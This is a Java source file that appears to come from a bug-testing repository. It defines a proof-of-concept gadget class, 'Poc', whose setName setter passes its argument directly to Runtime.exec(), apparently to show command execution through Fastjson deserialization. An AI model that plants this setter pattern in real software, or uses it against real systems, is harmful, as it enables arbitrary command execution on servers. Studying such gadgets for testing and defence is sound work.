package com.yichen.casetest.bugtest.fastjson;

import java.io.IOException;

/**
 * @author Qiuxinchao
 * @version 1.0
 * @date 2022/9/16 9:10
 * @describe
 */
public class Poc extends Exception{
    public void setName(String str) {
        try {
            Runtime.getRuntime().exec(str);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
